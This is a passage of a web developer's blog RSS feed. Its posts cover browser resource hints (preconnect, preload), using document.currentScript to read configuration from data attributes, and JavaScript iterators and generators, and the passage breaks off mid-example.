a hint for each distinct domain: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;link rel=&quot;preconnect&quot; href=&quot;https://images.macarthur.me&quot; /&amp;gt;
&amp;lt;link rel=&quot;preconnect&quot; href=&quot;https://images.jamcomments.com&quot; /&amp;gt;
&amp;lt;link rel=&quot;preconnect&quot; href=&quot;https://images.plausiblebootstrapper.com&quot; /&amp;gt;
&amp;lt;link rel=&quot;preconnect&quot; href=&quot;https://images.typeitjs.com&quot; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Those hints will clue in the browser to establish a full connection to the origin, without performing a download. It gets the DNS, TCP, and TLS steps out of the way, and our waterfall reflects that:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/11/CleanShot-2025-11-09-at-18.53.16@2x.png&quot; alt=&quot;preconnect waterfall&quot; loading=&quot;lazy&quot; width=&quot;1836&quot; height=&quot;478&quot; /&gt;&lt;/figure&gt;&lt;p&gt;In fact, neither the DNS, initial connection, nor SSL sections aren&apos;t even listed at all: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/11/CleanShot-2025-11-09-at-18.53.36@2x.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1216&quot; height=&quot;264&quot; /&gt;&lt;/figure&gt;&lt;p&gt;You can likely predict what&apos;ll happen if we drop an even more aggressive hint with &lt;code&gt;preload&lt;/code&gt;. This time, we&apos;ll call out each image specifically: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;link rel=&quot;preload&quot;
      as=&quot;image&quot;
      href=&quot;https://picperf.io/img/4CAF9H/rat.jpg&quot; /&amp;gt;
&amp;lt;link rel=&quot;preload&quot;
      as=&quot;image&quot;
      href=&quot;https://images.macarthur.me/img/4CAF9H/rat.jpg&quot; /&amp;gt;
&amp;lt;link rel=&quot;preload&quot;
      as=&quot;image&quot;
      href=&quot;https://images.jamcomments.com/img/4CAF9H/rat.jpg&quot; /&amp;gt;
&amp;lt;link rel=&quot;preload&quot;
      as=&quot;image&quot;
      href=&quot;https://images.plausiblebootstrapper.com/img/4CAF9H/rat.jpg&quot; /&amp;gt;
&amp;lt;link rel=&quot;preload&quot;
      as=&quot;image&quot;
      href=&quot;https://images.typeitjs.com/img/4CAF9H/rat.jpg&quot; 
/&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now there is &lt;em&gt;no delay&lt;/em&gt; in fetching the images. They&apos;re downloaded within a few milliseconds of page load, and are rendered to the page only when needed:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/11/CleanShot-2025-11-09-at-19.40.00@2x.png&quot; alt=&quot;preload waterfall&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;610&quot; /&gt;&lt;/figure&gt;&lt;p&gt;One more note on &lt;code&gt;preload&lt;/code&gt;: specifying the &lt;em&gt;exact&lt;/em&gt; URL matters. Even if the slightest character in a query string parameter differs, the browser will treat it as a distinct resource, causing a re-download of the same asset. Watch out for that footgun.&lt;/p&gt;&lt;h2&gt;Dream Big&lt;/h2&gt;&lt;p&gt;Neither DNS prefetching nor other resource hints revolutionize your page performance – they&apos;re more a scalpel than a chainsaw. Regardless, it&apos;s nice to have them within reach when there&apos;s opportunity for some small but real gains. Plus, when used in concert with the several other tools out there for tuning performance, you could end up with a bigger edge than you might&apos;ve expected. The impact may just snowball from there, leading to mind-blowing conversion rates, great wealth, and global renown for your impact in the front-end website performance space. You could even convince the Secretary of the Treasury to put your face on a bill.&lt;/p&gt;&lt;p&gt;Just dreamin&apos; here. &lt;/p&gt;</content:encoded></item><item><title>`document.currentScript` is more useful than I thought.</title><link>https://macarthur.me/posts/current-script</link><guid isPermaLink="true">https://macarthur.me/posts/current-script</guid><pubDate>Mon, 02 Jun 2025 11:00:13 GMT</pubDate><content:encoded>&lt;p&gt;Every so often, I stumble across a well-established JavaScript API in the browser that I probably should&apos;ve known about years ago. Examples include the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Window/screen?ref=cms.macarthur.me&quot;&gt;&lt;code&gt;window.screen&lt;/code&gt; property&lt;/a&gt; and the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/CSS/supports_static?ref=cms.macarthur.me&quot;&gt;&lt;code&gt;CSS.supports()&lt;/code&gt; method&lt;/a&gt;. To my relief, I&apos;ve realized I&apos;m not always alone in my ignorance. I remember posting about &lt;code&gt;window.screen&lt;/code&gt; and getting &lt;a href=&quot;https://x.com/amacarthur/status/1893471111238799840?ref=cms.macarthur.me&quot;&gt;a surprising amount of feedback&lt;/a&gt; from people who also didn&apos;t know of it. That made me feel a little less dumb.&lt;/p&gt;&lt;p&gt;I think the awareness of an API has less to do with how long it&apos;s been around, and more to do with its applicability to the problems we&apos;re trying to solve. If there aren&apos;t a ton of cases in which &lt;code&gt;window.screen&lt;/code&gt; is useful, people will tend to forget it exists.&lt;/p&gt;&lt;p&gt;But occasionally, there&apos;s the surprise opportunity to use one of these not-so-well-known features. I think I found (at least) one for &lt;code&gt;document.currentScript&lt;/code&gt;, and I intend to savor it for a while.&lt;/p&gt;&lt;h2&gt;What&apos;s it do?&lt;/h2&gt;&lt;p&gt;One glance at &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Document/currentScript?ref=cms.macarthur.me&quot;&gt;the API&lt;/a&gt; reveals what provides: a reference to the &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; element currently executing the code in which it&apos;s invoked.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;
  console.log(&quot;tag name:&quot;, document.currentScript.tagName);
  console.log(
    &quot;script element?&quot;, 
    document.currentScript instanceof HTMLScriptElement
  );
  
  // tag name: SCRIPT
  // script element? true
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since you get back the element itself, you&apos;re able to access properties like you would any other DOM node. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script data-external-key=&quot;123urmom&quot; defer&amp;gt;
  console.log(&quot;external key:&quot;, document.currentScript.dataset.externalKey);

  if (document.currentScript.defer) {
    console.log(&quot;script is deferred!&quot;);
  }
&amp;lt;/script&amp;gt;

// external key: 123urmom 
// script is deferred!&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pretty straightforward. And what should be obvious by now, browser support is of zero concern. It&apos;s been in all major browsers &lt;a href=&quot;https://caniuse.com/document-currentscript?ref=cms.macarthur.me&quot;&gt;for over a decade&lt;/a&gt;. That’s enough web years to form natural diamonds.&lt;/p&gt;&lt;h3&gt;No-Go for Modules&lt;/h3&gt;&lt;p&gt;A noteworthy tidbit about &lt;code&gt;document.currentScript&lt;/code&gt; is that it&apos;s &lt;em&gt;not&lt;/em&gt; available within modules. But oddly enough, you won&apos;t get &lt;code&gt;undefined&lt;/code&gt; for attempting to access it. Instead, it&apos;ll be set to &lt;code&gt;null&lt;/code&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script type=&quot;module&quot;&amp;gt;
  console.log(document.currentScript);
  console.log(document.doesNotExist);

  // null
  // undefined
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is a deliberate decision noted in &lt;a href=&quot;https://html.spec.whatwg.org/multipage/dom.html?ref=cms.macarthur.me#dom-document-currentscript-dev&quot;&gt;the specification&lt;/a&gt;. As soon as the &lt;code&gt;document&lt;/code&gt; is constructed, &lt;code&gt;currentScript&lt;/code&gt; is initialized with &lt;code&gt;null&lt;/code&gt;: &lt;/p&gt;&lt;blockquote&gt;The &lt;code&gt;currentScript&lt;/code&gt; attribute, on getting, must return the value to which it was most recently set. When the &lt;a href=&quot;https://html.spec.whatwg.org/multipage/dom.html?ref=cms.macarthur.me#document&quot;&gt;&lt;code&gt;Document&lt;/code&gt;&lt;/a&gt; is created, the &lt;a href=&quot;https://html.spec.whatwg.org/multipage/dom.html?ref=cms.macarthur.me#dom-document-currentscript&quot;&gt;&lt;code&gt;currentScript&lt;/code&gt;&lt;/a&gt; must be initialized to null.&lt;/blockquote&gt;&lt;p&gt;And since it&apos;s switched back to that initial value after the script synchronously executes, you&apos;ll also get &lt;code&gt;null&lt;/code&gt; when executing &lt;em&gt;asynchronous&lt;/em&gt; code:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;
  console.log(document.currentScript);
  // &amp;lt;script&amp;gt; tag

  setTimeout(() =&amp;gt; {
    console.log(document.currentScript);
    // null
  }, 1000);
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In light of that, there doesn&apos;t seem to be &lt;em&gt;any&lt;/em&gt; way of accessing the current script tag from within &lt;code&gt;&amp;lt;script type=&quot;module&quot; /&amp;gt;&lt;/code&gt;. The best you can do is know &lt;em&gt;whether&lt;/em&gt; the script is running in a module, and that&apos;s best accomplished by checking for &lt;code&gt;null&lt;/code&gt; (again, only if isn&apos;t performed inside any asynchronous activity).&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function isInModule() {
  return document.currentScript === null;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Don&apos;t bother checking for &lt;code&gt;import.meta&lt;/code&gt;, by the way, even if it&apos;s within a &lt;code&gt;try/catch&lt;/code&gt;. By simply &lt;em&gt;existing&lt;/em&gt; in a classic &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag, the browser will throw a &lt;code&gt;SyntaxError&lt;/code&gt;. It doesn&apos;t even need to run. It&apos;s thrown as the browser first parses the script&apos;s contents. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;
  // Will throw a `SyntaxError` without eveing being invoked!
  function isInModule() {
    try {
      return !!import.meta;
    } catch (e) {
      return false;
    }
  };

  // Also throws error:
  console.log(typeof import?.meta);
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since modules still lack this sort of feature, it&apos;ll be interesting to see how resolving it shakes out. A note in &lt;a href=&quot;https://html.spec.whatwg.org/multipage/dom.html?ref=cms.macarthur.me#dom-document-currentscript-dev&quot;&gt;the specification&lt;/a&gt; suggests it&apos;s an ongoing discussion:&lt;/p&gt;&lt;blockquote&gt;This API has fallen out of favor in the implementer and standards community, as it globally exposes &lt;a href=&quot;https://html.spec.whatwg.org/multipage/scripting.html?ref=cms.macarthur.me#the-script-element&quot;&gt;&lt;code&gt;script&lt;/code&gt;&lt;/a&gt; or &lt;a href=&quot;https://svgwg.org/svg2-draft/interact.html?ref=cms.macarthur.me#ScriptElement&quot;&gt;SVG &lt;code&gt;script&lt;/code&gt;&lt;/a&gt; elements. As such, it is not available in newer contexts, such as when running &lt;a href=&quot;https://html.spec.whatwg.org/multipage/webappapis.html?ref=cms.macarthur.me#module-script&quot;&gt;module scripts&lt;/a&gt; or when running scripts in a &lt;a href=&quot;https://dom.spec.whatwg.org/?ref=cms.macarthur.me#concept-shadow-tree&quot;&gt;shadow tree&lt;/a&gt;. We are looking into creating a new solution for identifying the running script in such contexts, which does not make it globally available: see &lt;a href=&quot;https://github.com/whatwg/html/issues/1013?ref=cms.macarthur.me&quot;&gt;issue #1013&lt;/a&gt;.&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/whatwg/html/issues/1013?ref=cms.macarthur.me&quot;&gt;That issue&lt;/a&gt;, by the way, is a long-lived one, stretching back to 2016 with a whole bunch of people contributing. Until it lands, I suppose querying for the element is your best bet: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script type=&quot;module&quot; id=&quot;moduleScript&quot;&amp;gt;
  const scriptTag = document.getElementById(&quot;moduleScript&quot;);

  // Do stuff.
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2&gt;The Need: Passing Configuration Properties&lt;/h2&gt;&lt;p&gt;I&apos;m using a Stripe pricing table on &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me#pricing&quot;&gt;PicPerf&apos;s website&lt;/a&gt;, embeddable by means of a &lt;a href=&quot;https://docs.stripe.com/payments/checkout/pricing-table?ref=cms.macarthur.me#embed&quot;&gt;native web component&lt;/a&gt;. Load a script, drop the element into your HTML, and set a couple of attributes: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;  &amp;lt;script
    async
    src=&quot;https://js.stripe.com/v3/pricing-table.js&quot;&amp;gt;
  &amp;lt;/script&amp;gt;

  &amp;lt;stripe-pricing-table
    pricing-table-id=&apos;prctbl_blahblahblah&apos;
    publishable-key=&quot;pk_test_blahblahblah&quot;
  &amp;gt;
  &amp;lt;/stripe-pricing-table&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s all well &amp;amp; good if you can pull a couple environment variables when your HTML&apos;s being rendered, but I wanted to embed the table in a &lt;em&gt;Markdown&lt;/em&gt; file. Markdown supports raw HTML just fine, but accessing those property values isn&apos;t as simple as reaching for &lt;code&gt;import.meta.env&lt;/code&gt; or &lt;code&gt;process.env&lt;/code&gt;. Instead, I&apos;d need to dynamically inject the values independently from the markup rendered to page.&lt;/p&gt;&lt;p&gt;Unfortunately, it&apos;s not possible to separate &lt;em&gt;rendering&lt;/em&gt; of the table from &lt;em&gt;accessing &amp;amp; setting&lt;/em&gt; its configuration properties. The values &lt;em&gt;must&lt;/em&gt; be available when the element is initialized.&lt;/p&gt;&lt;p&gt;That left me with injecting the entire element (property values &amp;amp; all) from within a client-side script. I&apos;d target a placeholder element in my Markdown, and plop in the finished table markup from there. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;## My Pricing Table

&amp;lt;div data-pricing-table&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;
  document.querySelectorAll(&apos;[data-pricing-table]&apos;).forEach(table =&amp;gt; {
    table.innerHTML = `
      &amp;lt;stripe-pricing-table
        pricing-table-id=&quot;STAY_TUNED&quot;
        publishable-key=&quot;STANY_TUNED&quot;
        client-reference-id=&quot;picperf&quot;
      &amp;gt;&amp;lt;/stripe-pricing-table&amp;gt;
    `;
})
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At this point, the only thing I&apos;m missing is the attribute values themselves. Server-rendering them onto the &lt;code&gt;window&lt;/code&gt; object was an option, but wouldn&apos;t leave a nice feeling in my tummy. It&apos;s not keen on shoveling things into the global scope like that.&lt;/p&gt;&lt;h3&gt;An Admission&lt;/h3&gt;&lt;p&gt;To be very honest, I could&apos;ve had this solved in about 14 seconds. PicPerf.io is built with Astro, which offers a &lt;a href=&quot;https://docs.astro.build/en/reference/directives-reference/?ref=cms.macarthur.me#definevars&quot;&gt;&lt;code&gt;define:vars&lt;/code&gt; directive&lt;/a&gt;. It&apos;s stupid-easy to make server-side variables available to client-side scripts:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;---
const truth = &quot;Taxation is theft.&quot;;
---

&amp;lt;style define:vars={{ truth }}&amp;gt;
  console.log(truth);

  // Taxation is theft.
&amp;lt;/style&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But there is neither fun nor a blog post in a problem solved so quickly. &lt;/p&gt;&lt;p&gt;More than that, &lt;code&gt;define:vars&lt;/code&gt; is a &lt;em&gt;highly proprietary&lt;/em&gt; way to address a challenge shared by &lt;em&gt;many&lt;/em&gt; other platforms and content management systems (I&apos;ve worked with them). &lt;/p&gt;&lt;h3&gt;A Challenge More Common Than You Might Think&lt;/h3&gt;&lt;p&gt;It&apos;s very usual for a CMS&apos;s constraints to be very narrow by design. An editor may be able to configure bits and pieces of the markup, but very rarely the contents of &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags. That&apos;s for good reason. A lot of potential security vulnerabilities there. &lt;/p&gt;&lt;p&gt;On top of that, those scripts often point to external packages shared by other teams, but still require some configuration. In those cases, server-rendering the values within the script isn’t an option at all. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- Shared library, but still requires configuration! --&amp;gt;
&amp;lt;script src=&quot;path/to/shared/signup-form.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In similar situations, I&apos;ve seen configuration values made available via server-rendered data attributes. You define the attribute values, and the script takes it from there. Modular single-page applications whose configuration is set on the root node are where I&apos;ve most often seen it:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;div
  id=&quot;app&quot;
  data-recaptcha-site-key=&quot;{{ siteKey }}&quot;
&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;import React from &apos;react&apos;;
import ReactDOM from &apos;react-dom/client&apos;;
import App from &apos;./App&apos;;

const appNode = document.getElementById(&apos;app&apos;);
const root = ReactDOM.createRoot(appNode);

root.render(
  // Use value plucked from root element.
  &amp;lt;App recaptchaSiteKey={appNode.dataset.recaptchaSiteKey} /&amp;gt;
);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It should be glaringly clear where I&apos;m going with this. Data attributes are a tidy way to pass specific values from the server to the client. In the SPA example above, the only extraordinarily nit-picky downside is the need to first query for the element before being able to access its attributes. &lt;/p&gt;&lt;p&gt;But since my scenario used a &lt;code&gt;&amp;lt;script /&amp;gt;&lt;/code&gt; tag instead of any other element, I could eliminate that complaint too. The &lt;code&gt;document.currentScript&lt;/code&gt; property provides it for free:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script 
  data-stripe-pricing-table=&quot;{{pricingTableId}}&quot;
  data-stripe-publishable-key=&quot;{{publishableKey}}&quot;
&amp;gt;
  const scriptData = document.currentScript.dataset;

  document.querySelectorAll(&apos;[data-pricing-table]&apos;).forEach(table =&amp;gt; {
    table.innerHTML = `
      &amp;lt;stripe-pricing-table
        pricing-table-id=&quot;${scriptData.stripePricingTable}&quot;
        publishable-key=&quot;${scriptData.stripePublishableKey}&quot;
        client-reference-id=&quot;picperf&quot;
      &amp;gt;&amp;lt;/stripe-pricing-table&amp;gt;
    `;
  })
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s feeling pretty nice. There&apos;s nothing magically proprietary going on, no values are being jammed into the global scope, and it enables me to gloat on X that I&apos;m &quot;using the platform.&quot; Wins all around.&lt;/p&gt;&lt;h2&gt;Other Applications&lt;/h2&gt;&lt;p&gt;Exploring this feature drew a couple other possible use cases to mind, one of which  pitched to me after this was originally published. &lt;/p&gt;&lt;h3&gt;Installation Guidance&lt;/h3&gt;&lt;p&gt;Say you maintain a JavaScript library that&apos;s required to be loaded asynchronously. It&apos;s simple to give quick, clear feedback using &lt;code&gt;document.currentScript&lt;/code&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script defer src=&quot;./script.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;// script.js

if (!document.currentScript.async) {
  throw new Error(&quot;This script must be loaded asynchronously!!!&quot;);
}

// The rest of the library...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You could even enforce a certain &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; position on the page. Maybe it has to be loaded just before the opening body tag:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const isFirstBodyChild =
  document.body.firstElementChild === document.currentScript;

if (!isFirstBodyChild) {
  throw new Error(
    &quot;This MUST be loaded immediately after the opening &amp;lt;body&amp;gt; tag.&quot;
  );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There&apos;s not much ambiguity in an error like that:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/06/CleanShot-2025-06-01-at-16.02.10@2x.png&quot; alt=&quot;error caused by loading script in wrong position&quot; loading=&quot;lazy&quot; width=&quot;1490&quot; height=&quot;272&quot; /&gt;&lt;/figure&gt;&lt;p&gt;In all, it provides some nice, guided reinforcement. A great counterpart to solid documentation.&lt;/p&gt;&lt;h3&gt;Locality of Behaviour&lt;/h3&gt;&lt;p&gt;This one was brought up by &lt;a href=&quot;https://www.reddit.com/r/javascript/comments/1l1hf9s/comment/mvnn8lj/?utm_source=share&amp;amp;utm_medium=web3x&amp;amp;utm_name=web3xcss&amp;amp;utm_term=1&amp;amp;utm_content=share_button&quot;&gt;ShotgunPayDay on Reddit&lt;/a&gt;. The Locality of Behavior principle asserts that you should be able to understand a chunk of code by looking at &lt;em&gt;only&lt;/em&gt; that chunk of code (Carson Gross has &lt;a href=&quot;https://htmx.org/essays/locality-of-behaviour/?ref=cms.macarthur.me&quot;&gt;a helpful post&lt;/a&gt; on it). Any sort of framework with &quot;single-file components&quot; (SFC) might come to mind. Everything&apos;s just &lt;em&gt;there&lt;/em&gt;, in one spot. &lt;/p&gt;&lt;p&gt;As it relates to &lt;code&gt;document.currentScript&lt;/code&gt;, it means you can build portable experiences just by virtue of elements being placed next to each other. Here&apos;s an example submits any form asynchronously just by placing the script tag right after it. Your central script would know to target the element right before &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// form-submitter.js

const form = document.currentScript.previousElementSibling;

form.addEventListener(&quot;submit&quot;, async (e) =&amp;gt; {
  e.preventDefault();

  const formData = new FormData(form);
  const method = form.method || &quot;POST&quot;;

  const submitGet = () =&amp;gt; fetch(`${form.action}?${params}`, {
    method: &quot;GET&quot;,
  });

  const submitPost = () =&amp;gt; fetch(form.action, {
    method: method,
    body: formData,
  });

  const submit = method === &quot;GET&quot; ? submitGet : submitPost;
  const response = await submit();

  form.reset();

  alert(response.ok ? &quot;Success!&quot; : &quot;Error occurred!&quot;);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And, it&apos;s just a matter of placing it where you&apos;d like to take effect:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;form action=&quot;/endpoint-one&quot; method=&quot;POST&quot;&amp;gt;
  &amp;lt;input type=&quot;text&quot; name=&quot;firstName&quot;/&amp;gt;
  &amp;lt;input type=&quot;text&quot; name=&quot;lastName&quot;/&amp;gt;
  &amp;lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;script src=&quot;form-submitter.js&quot;&amp;gt;&amp;lt;/script&amp;gt;

&amp;lt;form action=&quot;/endpoint-two&quot; method=&quot;POST&quot;&amp;gt;
  &amp;lt;input type=&quot;email&quot; name=&quot;emailAddress&quot; /&amp;gt;
  &amp;lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;script src=&quot;form-submitter.js&quot; &amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I doubt this pattern is something I&apos;ll reach for anytime soon, but it&apos;s interesting to know it&apos;s on the table.&lt;/p&gt;&lt;h2&gt;Feel&apos;s Good&lt;/h2&gt;&lt;p&gt;There&apos;s something very rewarding about finally understanding the utility of some of these web-old, lesser known features. It gives me an appreciation for the API designers of the early and adolescent web, especially knowing how often they need to deal with the arrogant complaints of modern programmers. I&apos;m eager to see what else I&apos;ll find. Maybe AGI&apos;s already in the HTML spec and we just haven&apos;t found it yet. &lt;/p&gt;</content:encoded></item><item><title>I think the ergonomics of generators is growing on me.</title><link>https://macarthur.me/posts/generators</link><guid isPermaLink="true">https://macarthur.me/posts/generators</guid><pubDate>Mon, 12 May 2025 10:00:39 GMT</pubDate><content:encoded>&lt;p&gt;I like the &quot;syntactic sugar&quot; JavaScript&apos;s seen over the past decade (arrow functions, template literals, destructuring assignment, etc.). I think it&apos;s because most of these features solved real pain points for me (some of which I didn&apos;t even know I had). The benefits were clear and there was plenty of opportunity to wield them. &lt;/p&gt;&lt;p&gt;But there are some oddballs in there... like generator functions. They&apos;ve been around just as long as other key ES2015+ features, but their practicality hasn&apos;t exactly caught on. You might not even immediately recognize one:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function* generateAlphabet() {
  yield &quot;a&quot;;
  yield &quot;b&quot;;
  // ... 
  yield &quot;z&quot;;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To be fair, I &lt;em&gt;have&lt;/em&gt; found them handy at least once. I&apos;ve written about using them for &lt;a href=&quot;https://macarthur.me/posts/destructuring-with-generators/?ref=cms.macarthur.me&quot;&gt;destructuring an arbitrary number of items&lt;/a&gt; on demand. I still love that use case, but I do wonder if there&apos;s something more I&apos;m missing out on. &lt;/p&gt;&lt;p&gt;So, I wanted to give them an honest, intentional shake. Maybe after getting a better feel for them, opportunities would pop up. To my surprise, I think I&apos;ve begun to appreciate both the ergonomics they offer and the mental model they encourage, at least in certain scenarios. I&apos;ll try to unwrap where I&apos;m at. First, let’s step back and flesh things out a bit. &lt;/p&gt;&lt;h2&gt;The Iterator &amp;amp; Iterable Protocols&lt;/h2&gt;&lt;p&gt;Generators won&apos;t make much sense unless we cover the two distinct protocols on which they depend: the &lt;em&gt;iterator&lt;/em&gt; and &lt;em&gt;iterable&lt;/em&gt; protocols. They both deal with &lt;em&gt;the process of producing an indeterminate sequence of values&lt;/em&gt;. The latter protocol builds upon the former.&lt;/p&gt;&lt;h3&gt;The Iterator Protocol&lt;/h3&gt;&lt;p&gt;This one standardizes the shape &amp;amp; behavior of an object that returns a sequence. At bare minimum, any object is an iterator if:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;It exposes a &lt;code&gt;next()&lt;/code&gt; method returning an object containing two properties: &lt;ul&gt;&lt;li&gt;&lt;code&gt;value: any&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;done: boolean&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href=&quot;https://tc39.es/ecma262/multipage/control-abstraction-objects.html?ref=cms.macarthur.me#sec-iterator-interface&quot;&gt;That&apos;s... it.&lt;/a&gt; Here&apos;s nice, simple one: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const gospelIterator = {
  index: -1,

  next() {
    const gospels = [&quot;Matthew&quot;, &quot;Mark&quot;, &quot;Luke&quot;, &quot;John&quot;];
    this.index++;

    return {
      value: gospels.at(this.index),
      done: this.index + 1 &amp;gt; gospels.length,
    };
  },
};

gospelIterator.next(); // {value: &apos;Matthew&apos;, done: false}
gospelIterator.next(); // {value: &apos;Mark&apos;, done: false}
gospelIterator.next(); // {value: &apos;Luke&apos;, done: false}
gospelIterator.next(); // {value: &apos;John&apos;, done: false}
gospelIterator.next(); // {value: undefined, done: true}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The sequence doesn&apos;t &lt;em&gt;have&lt;/em&gt; to end, by the way. Infinite iterators are perfectly OK: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const infiniteIterator = {
  count: 0,
  next() {
    this.count++;

    return {
      value: this.count,
      done: false,
    };
  },
};

infiniteGenerator.next(); // Counts forever...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Aside from providing some consistency, this protocol alone may not feel very useful. The &lt;em&gt;iterable protocol&lt;/em&gt; should help.&lt;/p&gt;&lt;h3&gt;The Iterable Protocol&lt;/h3&gt;&lt;p&gt;An object is &lt;em&gt;iterable&lt;/em&gt; if it has a &lt;code&gt;[Symbol.iterator]()&lt;/code&gt; method returning an &lt;em&gt;iterator &lt;/em&gt;object. Every time you&apos;ve used a &lt;code&gt;for...of&lt;/code&gt; loop or destructured an array, you&apos;ve leveraged this protocol. &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols?ref=cms.macarthur.me#built-in_iterables&quot;&gt;It&apos;s built into common primitives&lt;/a&gt;, including &lt;code&gt;String&lt;/code&gt;, &lt;code&gt;Array&lt;/code&gt;, and &lt;code&gt;Map&lt;/code&gt;. &lt;/p&gt;&lt;p&gt;Implementing it yourself allows you to define how a &lt;code&gt;for...of&lt;/code&gt; loop behaves. Building on the example from above, this is an iterable object:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const gospelIteratable = {
  [Symbol.iterator]() {
    return {
      index: -1,

      next() {
        const gospels = [&quot;Matthew&quot;, &quot;Mark&quot;, &quot;Luke&quot;, &quot;John&quot;];
        this.index++;

        return {
          value: gospels.at(this.index),
          done: this.index + 1 &amp;gt; gospels.length,
        };
      },
    };
  },
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, both a &lt;code&gt;for...of&lt;/code&gt; loop and destructuring will just work: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;for (const author of gospelIteratable) {
  console.log(author); // Matthew, Mark, Luke, John
}

console.log([...gospelIteratable]);
// [&apos;Matthew&apos;, &apos;Mark&apos;, &apos;Luke&apos;, &apos;John&apos;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&apos;s graduate to an example that can&apos;t be so easily mimicked with a simple array. Here&apos;s one iterating through every leap year after 1900:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function isLeapYear(year) {
  return year % 100 === 0 ? year % 400 === 0 : year % 4 === 0;
}

const leapYears = {
  [Symbol.iterator]() {
    return {
      startYear: 1900,
      currentYear: new Date().getFullYear(),
      next() {
        this.startYear++;

        while (!isLeapYear(this.startYear)) {
          this.startYear++;
        }

        return {
          value: this.startYear,
          done: this.startYear &amp;gt; this.currentYear,
        };
      },
    };
  },
};

for (const leapYear of leapYears) {
